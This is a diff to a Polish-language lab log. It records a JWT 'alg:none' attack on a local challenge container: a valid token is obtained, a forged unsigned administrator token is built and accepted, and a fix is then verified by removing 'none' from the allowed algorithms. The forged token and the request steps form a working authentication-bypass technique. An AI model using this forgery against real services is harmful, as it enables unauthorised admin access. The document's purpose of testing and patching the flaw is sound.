@@ -1,14 +1,31 @@
 JWT alg:none attack - dowod wykonania
 ========================================
 
+Srodowisko: lokalny kontener (docker run -p 443:443 jwt)
+Narzedzie:  curl (odpowiednik requestow Postmana none-obtain-token / none-send-token)
+Endpoint ataku: POST https://127.0.0.1:443/jwt/none
+Format body:    {"jwt_token":"<token>"}
+
+
+-- KROK 1: pobranie prawidlowego tokena --
+POST https://127.0.0.1:443/jwt   body: {"attack":"none"}
+
 Token oryginalny (uzytkownik Bob, HS256):
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2NvdW50IjoiQm9iIiwicm9sZSI6IlVzZXIiLCJpYXQiOjE3OTUwODQxODksImF1ZCI6Imh0dHBzOi8vMTI3LjAuMC4xL2p3dC9ub25lIn0.eqaDOq9zrmAZy9ojmCAftht2rO4v434JjXTDhYDR2y4
 
 
+-- KROK 2: preparacja tokena --
+Zmiany: header alg HS256 -> none, payload account Bob -> administrator,
+podpis usuniety (zachowana koncowa kropka).
+
 Token spreparowany (administrator, alg:none, bez podpisu):
 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhY2NvdW50IjoiYWRtaW5pc3RyYXRvciIsInJvbGUiOiJVc2VyIiwiaWF0IjoxNzk1MDg0MTg5LCJhdWQiOiJodHRwczovLzEyNy4wLjAuMS9qd3Qvbm9uZSJ9.
 
-Odpowiedz serwera na spreparowany token:
+
+-- KROK 3: wyslanie spreparowanego tokena (PRZED poprawka) --
+POST https://127.0.0.1:443/jwt/none
+
+Odpowiedz serwera - atak udany:
 {
     "message": "Congrats!! You've solved the JWT challenge!!",
     "jwt_token": {
@@ -25,3 +42,20 @@ Odpowiedz serwera na spreparowany token:
         "signature": ""
     }
 }
+
+
+========================================
+WERYFIKACJA POPRAWKI
+========================================
+Poprawka: w JWT.verify(...) lista algorytmow zmieniona
+          z ['none', 'HS256'] na ['HS256'] (app.js, handler /jwt/none).
+
+Po przebudowie obrazu (docker build + docker run) ten sam spreparowany
+token zostaje ODRZUCONY:
+
+POST https://127.0.0.1:443/jwt/none   body: {"jwt_token":"<spreparowany token>"}
+Odpowiedz serwera:
+{"name":"JsonWebTokenError","message":"invalid algorithm"}
+
+Prawidlowy token HS256 nadal przechodzi (zwraca "Congrats!!"),
+wiec poprawka nie psuje normalnego logowania.
